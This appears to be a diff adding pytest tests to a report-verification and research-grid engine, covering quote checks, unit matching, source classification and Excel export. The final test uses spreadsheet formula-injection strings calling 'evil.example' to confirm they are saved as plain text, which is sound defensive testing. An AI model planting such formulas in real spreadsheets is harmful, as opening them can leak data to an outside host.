@@ -321,3 +321,71 @@ def test_document_grid_answers_only_from_each_rows_passages(tmp_path):
     assert ws["C3"].value == G.NOT_FOUND and ws["C3"].comment is not None
     assert wb["Sources"]["A2"].value.startswith("S") and "Alpha Corp" in wb["Sources"]["B2"].value
     assert G.check_cell("$12.4 billion", ["S9.p1"], {"S1.p1": "x"}).startswith("cites passages")
+
+
+def test_sources_split_only_at_the_exact_sources_heading(tmp_path):
+    c = corpus(tmp_path)
+    sec, reu, _ = ids(c)
+    body = good_body(c).replace("\n- Supply", "\n## Sources and uses of funds\n\nThe deal raised $999 billion "
+                                f"[{sec}.p1].\n\n- Supply")
+    probs = V.check(_report(c, body), c, min_sources=2)
+    assert any(p["check"] == "R2 number not in cited passages" and "$999" in p["detail"] for p in probs)
+    md = _report(c, body)
+    assert md.count("## Sources\n") == 1 and "## Sources and uses of funds" in md     # finalize keeps the section
+
+
+def test_units_must_agree_and_quotes_may_span_sentences(tmp_path):
+    a, b = R.parse_numbers("65%")[0], R.parse_numbers("$65 million")[0]
+    assert not V._same_bare(a, b) and V._same_bare(R.parse_numbers("65")[0], b)
+    c = corpus(tmp_path)
+    sec, reu, _ = ids(c)
+    md = _report(c, good_body(c) + f"\nData Center revenue was 193.7% of plan [{sec}.p1].\n")
+    assert any("193.7%" in p["detail"] for p in V.check(md, c, min_sources=2))
+    fake = good_body(c) + f"\nThe filing said \"Revenue fell sharply. Demand collapsed in every region\" [{sec}.p1].\n"
+    assert any(p["check"] == "R3 quote not verbatim" for p in V.check(_report(c, fake), c, min_sources=2))
+    real = good_body(c) + (f"\nReuters wrote \"according to the company's annual report. Analysts said that demand "
+                           f"for the company's Blackwell systems remained strong\" [{reu}.p1].\n")
+    assert not V.check(_report(c, real), c, min_sources=2)
+
+
+def test_find_does_not_mutate_shared_passages(tmp_path):
+    from concurrent.futures import ThreadPoolExecutor
+    c = corpus(tmp_path)
+    qs = ["data center revenue fiscal year 2026", "gross margin", "buybacks dividends shareholders", "Blackwell"] * 8
+    alone = {q: [(p.id, p.score) for p in c.find(q, k=4)] for q in set(qs)}
+    with ThreadPoolExecutor(8) as ex:
+        got = list(ex.map(lambda q: (q, [(p.id, p.score) for p in c.find(q, k=4)]), qs))
+    assert all(r == alone[q] for q, r in got)
+    assert all(p.score == 0.0 for p in c.passages.values())             # scores live on the returned copies
+
+
+def test_issuer_path_rule_skips_aggregators():
+    assert R.classify("https://www.nasdaq.com/articles/earnings-preview-nvda")[0] == 3
+    assert R.classify("https://www.marketbeat.com/earnings/reports/2026-2-25-nvidia/")[0] == 3
+    assert R.classify("https://www.investors.com/news/technology/nvda-earnings/")[0] == 3
+    assert R.classify("https://investor.nvidia.com/news/x")[0] == 1
+    assert R.classify("https://nvidianews.nvidia.com/earnings-q4-fy26")[0] == 1
+
+
+def test_small_guards():
+    from engines.research.engine import finish_check
+    with pytest.raises(ValueError):
+        V.safe_eval("10^400")                                          # OverflowError is a bad calc, not a crash
+    msg = finish_check("x", [{"path": "report.md"}, None], SimpleNamespace(root=Path("/nonexistent")))
+    assert msg.startswith("ENGINE CHECK")                               # non-string artifacts do not crash
+    from engines.data.checks import trace_numbers
+    assert trace_numbers("Revenue was $2,045", "total 1999")              # an amount, not a year
+    assert not trace_numbers("mean 3.14", "3.1449") and trace_numbers("mean 3.14", "3.12")
+    assert not trace_numbers("about 45 units", "44.7")
+
+
+def test_grid_excel_keeps_formula_text_as_text(tmp_path):
+    from openpyxl import load_workbook
+    from engines.research import grid as G
+    c = R.Corpus(str(tmp_path), now="2026-11-13")
+    s = c.add_text('=HYPERLINK("http://evil.example","x")', "Gamma revenue for fiscal 2026 was $5.5 billion. " * 4,
+                   "https://www.sec.gov/gamma", "Gamma", "2026-02-01")
+    g = G.Grid([s.label], ["=1+1"])
+    g.cells[(0, 0)] = G.Cell("=WEBSERVICE(\"http://evil.example\")", [f"{s.id}.p1"], True)
+    ws = load_workbook(G.to_excel(g, c, str(tmp_path / "g.xlsx")))["Grid"]
+    assert all(ws[x].data_type == "s" for x in ("B1", "B2"))
